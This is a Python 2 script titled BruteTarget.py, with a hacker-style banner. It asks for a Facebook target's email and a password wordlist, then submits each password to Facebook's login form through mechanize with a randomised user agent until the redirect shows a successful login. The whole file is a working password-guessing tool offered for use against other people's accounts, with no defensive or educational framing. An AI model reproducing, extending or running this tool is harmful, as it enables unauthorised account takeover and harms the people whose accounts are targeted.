#!/usr/bin/env python
# encoding: utf-8
"""
BruteTarget.py

Created by AuthenticXploit on 08/12/2020.
Copyright (c) 2020 Copyright Holder. All rights reserved.
"""

# Color
g = "\033[32;1m"
gt = "\033[0;32m"
bt = "\033[34;1m"
b = "\033[36;1m"
m = "\033[31;1m"
p = "\033[37;1m"
k = "\033[33;1m"
kt = "\033[0;33m"
W = '\x1b[0m'

# Import module
try:
    import sys
    import mechanize
    import cookielib
    import random
    import os
    import time
    from os import system
    from time import sleep
    from sys import exit
except ImportError as f:
    system("clear")
    print("%s[%s!%s] %sError %s: %s%s"%(g,m,g,kt,f))

banner = """\033[36;1m
  ____             _       _____ ____  
 | __ ) _ __ _   _| |_ ___|  ___| __ ) 
 |  _ \| '__| | | | __/ _ \ |_  |  _ \\\033[1;97m
 | |_) | |  | |_| | ||  __/  _| | |_) |
 |____/|_|   \__,_|\__\___|_|   |____/ 
                     
     \x1b[1;97m Author   \033[31;1m:  \033[32mAuthenticXploit
     \x1b[1;97m Type     \033[31;1m:  \033[32mBruteForce
     \x1b[1;97m Version  \033[31;1m:  \033[32m0.2
     \x1b[1;97m Thanks   \033[31;1m:  \033[32mN16HT-W4RR10R
     \x1b[1;97m
"""

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        sleep(2.0 / 90)

system("clear")
slowprint(banner)
email = str(raw_input("\033[37;1minput facebook target \033[31;1m: \033[33;1m"))

passwordlist = str(raw_input("\033[37;1minput wordlist \033[31;1m: \033[33;1m"))

login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def main():
    try:
        global br
        br = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_cookiejar(cj)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        menu()
        search()
        print("%s[%s!%s]%s Password does not exist in the wordlist" % (g,m,g,k))
    except mechanize.URLError:
        print("\n%s[%s!%s]%s No Connection" % (g,m,g,k))
        sleep(2)
        print("%s[%s!%s] %sExit%s" % (g,m,g,m,W))
        exit()

def brute(password):
    sys.stdout.write(b+"\r["+k+"-"+b+"] "+p+"Trying Password "+m+"=> "+k+"{}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr = 0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and (not 'login_attempt' in log):
        print(b+"["+k+"+"+b+"] "+p+"Password Found => "+g+"{}".format(password))
        raw_input("\033[31;1mANY KEY to Exit....")
        exit(1)

def search():
    global password
    passwords = open(passwordlist,"r")
    for password in passwords:
        password = password.replace("\n","")
        brute(password)

#menu
def menu():
    try:
        total = open(passwordlist,"r")
        total = total.readlines()
        print(banner)
        print b+"["+m+"-"+b+"] "+g+"Account to crack "+m+"> \033[0;33m{}".format(email)
        print b+"["+m+"-"+b+"] "+g+"Loaded "+m+">\033[0;33m" , len(total), "passwords"
        print("%s[%s-%s] %sCracking, please wait ...\n" % (b,m,b,k))
    except IOError:
        print("\n%s[%s!%s]%s File wordlist %s%s %sNot Found%s" % (g,m,g,k,b,passwordlist,k,W))
        exit()
	
if __name__ == '__main__':
    try:
        main()
    except(KeyboardInterrupt, EOFError):
        print("%s\n[%s!%s]%sDetects a forced stop program %s" % (b,m,b,k,W))
        exit(0)